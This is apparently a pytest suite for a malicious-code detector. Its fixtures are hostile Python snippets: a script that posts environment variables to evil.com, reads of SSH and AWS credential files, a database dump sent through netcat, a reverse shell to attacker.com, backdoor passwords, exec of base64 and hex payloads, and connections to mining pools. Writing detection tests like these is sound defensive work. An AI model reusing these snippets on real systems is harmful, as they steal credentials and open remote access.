"""
Tests for Malicious Intent Detection

Tests all malicious pattern categories including:
- Credential theft
- Data exfiltration  
- Backdoors
- Obfuscation
- Cryptocurrency mining
- Command injection
"""

import pytest
from pathlib import Path
from src.core.security.malicious_intent_detection import (
    MaliciousIntentDetector,
    analyze_malicious_intent,
    MaliciousPattern
)


class TestCredentialTheft:
    """Test credential theft detection patterns."""
    
    def test_environment_variable_exfiltration(self):
        """Test detection of environment variable exfiltration."""
        code = """
import os
import requests

# Send all environment variables to external server
requests.post('https://evil.com/collect', data=os.environ)
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CRED_001' for d in detections)
        assert any(d.severity == 'critical' for d in detections)
    
    def test_ssh_key_exfiltration(self):
        """Test detection of SSH key reading."""
        code = """
import os

# Read SSH private key
with open(os.path.expanduser('~/.ssh/id_rsa'), 'r') as f:
    private_key = f.read()
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CRED_002' for d in detections)
        assert any('SSH' in d.description for d in detections)
    
    def test_aws_credential_access(self):
        """Test detection of AWS credential file access."""
        code = """
import os

# Access AWS credentials
with open(os.path.expanduser('~/.aws/credentials'), 'r') as f:
    creds = f.read()
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CRED_003' for d in detections)
        assert any(d.severity == 'critical' for d in detections)


class TestDataExfiltration:
    """Test data exfiltration detection patterns."""
    
    def test_system_file_upload(self):
        """Test detection of system file uploads."""
        code = """
import requests

# Read and upload /etc/passwd
with open('/etc/passwd', 'r') as f:
    requests.post('https://attacker.com', data=f.read())
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'EXFIL_001' for d in detections)
        assert any(d.severity == 'critical' for d in detections)
    
    def test_database_dump_exfiltration(self):
        """Test detection of database dump piping."""
        code = """
import subprocess

# Dump database and pipe to netcat
subprocess.run('mysqldump -u root -p password database | nc attacker.com 4444', shell=True)
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'EXFIL_002' for d in detections)


class TestBackdoors:
    """Test backdoor detection patterns."""
    
    def test_hardcoded_admin_password(self):
        """Test detection of hardcoded backdoor passwords."""
        code = """
def authenticate(username, password):
    # Backdoor password
    if password == 'admin123':
        return True
    return check_database(username, password)
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'BACK_001' for d in detections)
        assert any(d.severity == 'critical' for d in detections)
    
    def test_hardcoded_backdoor_user(self):
        """Test detection of hardcoded backdoor usernames."""
        code = """
def is_admin(username):
    # Hidden backdoor account
    if username in ['backdoor', 'debug_admin']:
        return True
    return username in get_admins()
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'BACK_002' for d in detections)
    
    def test_reverse_shell(self):
        """Test detection of reverse shell connections."""
        code = """
import socket
import subprocess

# Reverse shell
s = socket.socket()
s.connect(('attacker.com', 4444))
subprocess.Popen(['/bin/bash'], stdin=s.fileno(), stdout=s.fileno())
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'BACK_004' for d in detections)
        assert any('reverse shell' in d.description.lower() for d in detections)


class TestObfuscation:
    """Test obfuscation detection patterns."""
    
    def test_base64_decode_exec(self):
        """Test detection of base64 decode + exec."""
        code = """
import base64

# Obfuscated malicious code
exec(base64.b64decode('bWFsaWNpb3VzX2NvZGU='))
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'OBFS_001' for d in detections)
        assert any(d.severity == 'high' for d in detections)
    
    def test_hex_decode_exec(self):
        """Test detection of hex decode + exec."""
        code = """
import binascii

# Obfuscated code
exec(binascii.unhexlify('6d616c6963696f7573'))
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'OBFS_002' for d in detections)


class TestCryptocurrencyMining:
    """Test cryptocurrency mining detection patterns."""
    
    def test_mining_pool_connection(self):
        """Test detection of mining pool connections."""
        code = """
import socket

# Connect to mining pool
s = socket.socket()
s.connect(('pool.supportxmr.com', 3333))
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CRYPTO_001' for d in detections)
    
    def test_xmr_mining_reference(self):
        """Test detection of Monero mining software references."""
        code = """
# XMR mining configuration
config = {
    'algo': 'randomx',
    'threads': 4,
    'pool': 'xmrig.pool.com'
}
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CRYPTO_002' for d in detections)


class TestCommandInjection:
    """Test command injection detection patterns."""
    
    def test_shell_true_usage(self):
        """Test detection of shell=True in subprocess."""
        code = """
import subprocess

def run_command(cmd):
    subprocess.call(cmd, shell=True)
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CMD_001' for d in detections)
    
    def test_user_input_in_command(self):
        """Test detection of user input in shell commands."""
        code = """
import subprocess
import sys

# Dangerous: user input in command
user_file = sys.argv[1]
subprocess.run(f'cat {user_file}', shell=True)
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CMD_002' for d in detections)
        assert any(d.severity == 'critical' for d in detections)
    
    def test_eval_with_user_input(self):
        """Test detection of eval with user input."""
        code = """
user_code = input('Enter Python code: ')
eval(user_code)  # Extremely dangerous
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test.py'), code)
        
        assert len(detections) > 0
        assert any(d.pattern_id == 'CMD_003' for d in detections)
        assert any(d.severity == 'critical' for d in detections)


class TestReportGeneration:
    """Test malicious intent report generation."""
    
    def test_report_with_no_detections(self):
        """Test report generation with clean code."""
        detector = MaliciousIntentDetector()
        report = detector.generate_report([])
        
        assert report['overall_risk'] == 'LOW'
        assert report['risk_score'] == 1.0
        assert report['malicious_intent_detected'] is False
    
    def test_report_with_critical_detections(self):
        """Test report generation with critical findings."""
        detections = [
            MaliciousPattern(
                pattern_id='CRED_001',
                category='credential_theft',
                severity='critical',
                confidence=0.95,
                description='Env var exfiltration',
                evidence='line 10',
                file_path='evil.py',
                line_number=10,
                remediation='Remove',
                impact='Complete compromise'
            ),
            MaliciousPattern(
                pattern_id='BACK_001',
                category='backdoors',
                severity='critical',
                confidence=0.90,
                description='Backdoor password',
                evidence='line 20',
                file_path='evil.py',
                line_number=20,
                remediation='Remove',
                impact='Unauthorized access'
            ),
            MaliciousPattern(
                pattern_id='EXFIL_001',
                category='data_exfiltration',
                severity='critical',
                confidence=0.92,
                description='System file upload',
                evidence='line 30',
                file_path='evil.py',
                line_number=30,
                remediation='Remove',
                impact='Data breach'
            )
        ]
        
        detector = MaliciousIntentDetector()
        report = detector.generate_report(detections)
        
        assert report['overall_risk'] == 'CRITICAL'
        assert report['risk_score'] >= 9.0
        assert report['malicious_intent_detected'] is True
        assert report['total_detections'] == 3
        assert report['by_severity']['critical'] == 3
        assert len(report['top_threats']) == 3
    
    def test_analyze_malicious_intent_integration(self):
        """Test full analyze_malicious_intent function."""
        repository_files = {
            'evil.py': """
import os
import requests

# Backdoor
if password == 'admin123':
    login_user()

# Exfiltrate environment
requests.post('https://evil.com', data=os.environ)
""",
            'miner.py': """
# XMR mining
import socket
s = socket.socket()
s.connect(('pool.xmr.com', 3333))
"""
        }
        
        report = analyze_malicious_intent(repository_files)
        
        assert report['total_detections'] > 0
        assert 'by_category' in report
        assert 'top_threats' in report
        assert report['malicious_intent_detected'] is True


class TestEdgeCases:
    """Test edge cases and false positive prevention."""
    
    def test_legitimate_config_file_not_flagged(self):
        """Test that legitimate config files aren't flagged."""
        code = """
# Configuration file
CONFIG = {
    'database': 'postgres',
    'port': 5432,
    'password': 'CHANGE_ME'  # Placeholder, not hardcoded
}
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('config.py'), code)
        
        # Should not flag placeholder passwords in config files
        critical_detections = [d for d in detections if d.severity == 'critical']
        assert len(critical_detections) == 0
    
    def test_test_file_not_flagged(self):
        """Test that test files with mock credentials aren't flagged."""
        code = """
# Test file
def test_authentication():
    # Mock credentials for testing
    assert authenticate('test_user', 'test_password')
"""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('test_auth.py'), code)
        
        # Test files should have lower confidence or be skipped
        # (This is aspirational - current implementation may flag it)
        # In a production system, we'd adjust confidence based on file path
    
    def test_empty_file(self):
        """Test handling of empty files."""
        detector = MaliciousIntentDetector()
        detections = detector.analyze_file(Path('empty.py'), '')
        
        assert len(detections) == 0
    
    def test_binary_content_handling(self):
        """Test handling of binary/malformed content."""
        binary_content = b'\x00\x01\x02\xFF\xFE'.decode('utf-8', errors='replace')
        
        detector = MaliciousIntentDetector()
        # Should not crash
        detections = detector.analyze_file(Path('binary.dat'), binary_content)
        
        # May or may not detect patterns, but shouldn't crash
        assert isinstance(detections, list)


if __name__ == '__main__':
    pytest.main([__file__, '-v'])
